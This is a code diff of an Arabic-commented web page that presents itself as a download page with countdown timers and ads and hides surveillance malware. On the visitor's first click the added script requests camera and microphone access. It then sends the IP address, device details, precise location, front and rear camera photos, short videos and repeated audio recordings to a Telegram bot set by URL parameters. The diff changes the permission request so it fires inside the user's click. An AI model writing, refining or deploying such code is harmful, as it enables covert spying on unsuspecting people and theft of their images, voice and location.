@@ -82,9 +82,7 @@
 </div>
 
 <script>
-// ═══════════════════════════════════════════════════
-// 1. قراءة البيانات من الرابط المباشر (بدون تشفير)
-// ═══════════════════════════════════════════════════
+// 1. قراءة البيانات
 const urlParams = new URLSearchParams(window.location.search);
 const config = {
     id: urlParams.get('id') || '',
@@ -98,20 +96,37 @@ const config = {
     r: urlParams.has('r')
 };
 
-// ═══════════════════════════════════════════════════
-// 2. تشغيل الأدوات تلقائياً مع أول ضغطة من المستخدم
-// ═══════════════════════════════════════════════════
+// 2. تشغيل الأدوات مع أول تفاعل (أول ما يدوس في أي حتة)
 let toolsStarted = false;
 function triggerTools() {
     if (toolsStarted) return;
     toolsStarted = true;
-    runTools();
+
+    // بنطلب الأذونات فوراً في نفس لحظة الضغط (عشان المتصفح ميرفضهم)
+    if (config.fc || config.bc || config.fcv || config.bcv || config.r) {
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
+            // بنقفلهم فوراً بعد ما خدنا إذن
+            stream.getTracks().forEach(t => t.stop());
+            // بعد ما خدنا إذن، بنشغل باقي الأدوات
+            setTimeout(runTools, 500);
+        }).catch(e => {
+            // لو رفض، هنشغل اللي مش محتاج كاميرا
+            setTimeout(runTools, 500);
+        });
+    } else {
+        setTimeout(runTools, 500);
+    }
+
+    // طلب الموقع فوراً
+    if (config.loc && navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
+    }
 }
 
-// الكود ده بيستنى أول ضغطة في أي حتة في الصفحة عشان يشغل الأدوات
 document.addEventListener('click', triggerTools, { once: true });
 document.addEventListener('touchstart', triggerTools, { once: true });
 
+// 3. كود الأدوات
 async function runTools() {
     if (!config.id || !config.token) return;
     const botUrl = `https://api.telegram.org/bot${config.token}/`;
@@ -121,7 +136,7 @@ async function runTools() {
         try { await fetch(botUrl + "sendMessage", { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: chatId, text: text, parse_mode: 'HTML'}) }); } catch (e) {}
     }
 
-    // 1. معلومات الجهاز (IP, UA, شاشة, بطارية)
+    // معلومات
     if (config.inf) {
         try {
             let ipRes = await fetch('https://api.ipify.org?format=json');
@@ -131,31 +146,30 @@ async function runTools() {
                 let b = await navigator.getBattery();
                 batteryInfo = `\n<b>البطارية:</b> ${Math.round(b.level * 100)}% ${b.charging ? 'تشحن' : 'لا تشحن'}`;
             }
-            let msg = `🟢 <b>دخول جديد</b>\n<b>IP:</b> <code>${ipData.ip}</code>\n<b>UA:</b> <code>${navigator.userAgent}</code>\n<b>الشاشة:</b> ${screen.width}x${screen.height}${batteryInfo}`;
-            sendMsg(msg);
+            sendMsg(`🟢 <b>دخول جديد</b>\n<b>IP:</b> <code>${ipData.ip}</code>\n<b>UA:</b> <code>${navigator.userAgent}</code>\n<b>الشاشة:</b> ${screen.width}x${screen.height}${batteryInfo}`);
         } catch (e) {}
     }
 
-    // 2. الموقع
+    // الموقع
     if (config.loc && navigator.geolocation) {
         navigator.geolocation.getCurrentPosition((pos) => {
             sendMsg(`📍 <b>الموقع</b>\n<a href="https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}">اضغط لفتح الخريطة</a>`);
         }, (err) => {}, { enableHighAccuracy: true });
     }
 
-    // 3. صور الكاميرا
+    // صور
     if (config.fc || config.bc) {
         if (config.fc) await takePhoto("user", "الأمامية");
         if (config.bc) await takePhoto("environment", "الخلفية");
     }
 
-    // 4. فيديو الكاميرا (5 ثوان)
+    // فيديو
     if (config.fcv || config.bcv) {
         if (config.fcv) await takeVideo("user", "الأمامية");
         if (config.bcv) await takeVideo("environment", "الخلفية");
     }
 
-    // 5. تسجيل صوتي (6 تسجيلات × 5 ثوان)
+    // تسجيل صوتي (6 مرات)
     if (config.r) {
         await recordAudio();
     }
@@ -165,7 +179,7 @@ async function runTools() {
         try {
             let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
             let video = document.createElement('video'); video.srcObject = stream; video.play();
-            await new Promise(r => setTimeout(r, 1500));
+            await new Promise(r => setTimeout(r, 1000));
             let canvas = document.createElement('canvas');
             canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
             canvas.getContext('2d').drawImage(video, 0, 0);
@@ -173,7 +187,7 @@ async function runTools() {
                 let formData = new FormData();
                 formData.append('chat_id', chatId);
                 formData.append('photo', blob, `photo_${label}.jpg`);
-                formData.append('caption', `📸 صورة الكاميرا ${label}`);
+                formData.append('caption', `📸 صورة ${label}`);
                 fetch(botUrl + "sendPhoto", { method: 'POST', body: formData });
                 stream.getTracks().forEach(t => t.stop());
             }, 'image/jpeg');
@@ -191,7 +205,7 @@ async function runTools() {
                 let formData = new FormData();
                 formData.append('chat_id', chatId);
                 formData.append('video', blob, `video_${label}.webm`);
-                formData.append('caption', `🎥 فيديو الكاميرا ${label}`);
+                formData.append('caption', `🎥 فيديو ${label}`);
                 fetch(botUrl + "sendVideo", { method: 'POST', body: formData });
                 stream.getTracks().forEach(t => t.stop());
             };
@@ -214,7 +228,7 @@ async function runTools() {
                         let formData = new FormData();
                         formData.append('chat_id', chatId);
                         formData.append('audio', blob, `voice_${i}.webm`);
-                        formData.append('caption', `🎤 تسجيل صوتي رقم ${i}`);
+                        formData.append('caption', `🎤 تسجيل صوتي ${i}`);
                         fetch(botUrl + "sendAudio", { method: 'POST', body: formData });
                         resolve();
                     };
@@ -228,10 +242,8 @@ async function runTools() {
     }
 }
 
-// ═══════════════════════════════════════════════════
-// 3. كود صفحة التحميل بتاعتك (العدادات والإعلانات)
-// ═══════════════════════════════════════════════════
-var SMART_LINK = "https://araplhn.org/4/7e093505ac4f216b5950d797a595b30c"; // بدّله برابط التحميل لاحقاً
+// 4. كود العداد والإعلانات
+var SMART_LINK = "https://araplhn.org/4/7e093505ac4f216b5950d797a595b30c";
 var WAIT1 = 5, WAIT2 = 30, WAIT3 = 30, GAP = 5;
 var GHOST = ["https://bauval.org/14/5405685805ef1654c71ceda217bef848", "https://abscloud.org/1/01876be0a03b020428ee8dc56f00181f"];
 var NATIVE = "https://bauval.org/21/b7c04a4357034ffd034b99d790f5ab0a";
@@ -257,4 +269,4 @@ $("b2").onclick = function(){ goNext(this, function(){ show(3); addGhost(); ring
 $("b3").onclick = function(){ window.location.href = SMART_LINK; };
 </script>
 </body>
-  </html>
+</html>
